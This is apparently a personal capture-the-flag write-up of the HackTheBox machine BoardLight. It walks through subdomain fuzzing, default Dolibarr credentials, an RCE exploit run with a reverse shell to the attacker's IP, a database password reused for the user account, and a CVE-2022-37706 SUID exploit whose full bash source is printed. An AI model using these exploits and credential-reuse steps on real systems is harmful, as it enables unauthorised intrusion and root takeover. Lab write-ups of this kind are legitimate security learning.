---
created: 2025-08-16
---

📅 `2025-08-16`

#subdomain #default-credentials #cve #cred-hunting #password-reuse #suid

----

## 🖥️ Box Info

| ️🏷️ Name         |  `BoardLight`   |
| --------------- | --------------- |
| 📆 Release Date |  `2024-05-25`   |
| 🌐 IP Address   |  `10.10.11.11`  |
| 🖥️ OS           |  `Linux`        |
| 🎯 Difficulty   |  `Easy`         |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Find domain in contact email
- Subdomain enumeration
- Default/weak credentials
- Web app `CVE`
- Credential hunting
- Password reuse
- `CVE` on `SUID` binary

**🛠️ Tools:**  

- `ffuf`

**📚 Learned:**  

- Look for a domain name somewhere if nothing comes up.
- Always try default/weak credentials (use `creds`).
- Again, password reuse.
- Even if a binary isn't on `GTFOBins`, it's still worth searching for exploits.
- The correct syntax for `su` is `su - <user>` or just `su -` if becoming root.

----

## 🌐 Port Scan

- **TCP**: 22, 80
- **UDP**: None

---

## 🔍 Enumeration

The only port worth enumerating was `80`, and it was a web server hosting a website for a company's cybersecurity services.

![[Pasted image 20250817123437.png]]

Initial enumeration revealed that the website used `PHP` as the backend language. Fuzzing for directories found nothing interesting, and there was no login panel or way to create an account. When scrolling to the bottom I found this:

![[Pasted image 20250817123618.png]]

This email uses the `board.htb` domain. I added it to `/etc/hosts` and fuzzed for subdomains.

```shell
ffuf -u 'http://board.htb' -H 'Host: FUZZ.board.htb' -w $SUBDOMAINS -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 154ms]
```

This found the subdomain `crm.board.htb`, which has this login panel:

![[Pasted image 20250817123811.png]]

It showed the web app's software (`Dolibarr`) and its version (`17.0.0`). Before looking for any exploits I tried some default credentials.

```shell
creds search dolibarr

+----------+----------+----------+
| Product  | username | password |
+----------+----------+----------+
| dolibarr |  admin   |  admin   |
| dolibarr |  admin   | changeme |
+----------+----------+----------+
```

`admin`:`admin` worked.

![[Pasted image 20250817124000.png]]

---

## 🪜 Foothold

The app has an interesting feature for creating websites, but I couldn't create a site with `PHP`, so I started looking for exploits. I found [this](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) exploit for `CVE-2023-30253`, a vulnerability that affects `Dolibarr` versions before `17.0.1`. This vulnerability allows remote code execution by any authenticated user via an uppercase manipulation (`<?PHP` instead of `<?php`) in injected data.

I downloaded the exploit, started a listener, ran the exploit, and got a shell as `www-data`.

```shell
listen linux 1234
```

```shell
python exploit.py http://crm.board.htb admin admin 10.10.14.7 1234
```

```shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
www-data
```

---

## 👤 User

Enumerating the web app I found the file `/var/www/html/crm.board.htb/htdocs/conf/conf.php`. It had database credentials.

```shell
cat conf.php

<SNIP>

$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';

<SNIP>
```

I tried the credentials on the database (which was `MySQL`) and they worked. I started enumerating the database and found nothing useful. The only user on the machine was `larissa` (`/etc/passwd` and `ls /home`), and the password worked for her with `su - larissa`. User flag found.

- `larissa`:`serverfun2$2023!!`

We can now `SSH` into the machine.

---

## 🛡️ Privilege Escalation

User `larissa` is a member of the `adm` group. This group lets its members read several logs from `/var/log/`. The logs were a rabbit hole. After more enumeration I found `SUID` files related to the `enlightenment` window manager. I found [this](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) exploit, which escalates privileges through the `SUID` binary `enlightenment_sys`. It's a very short `bash` script, so here is its full source code:

```shell
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

I transferred it to the target, ran it, and got root. For learning purposes I tried running this exploit as user `www-data` and found that it doesn't have enough permissions, so becoming `larissa` first was necessary.

```shell
www-data@boardlight:/tmp$ ./e.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
ERROR: ACTION NOT ALLOWED: /bin/mount
```

Rooted.
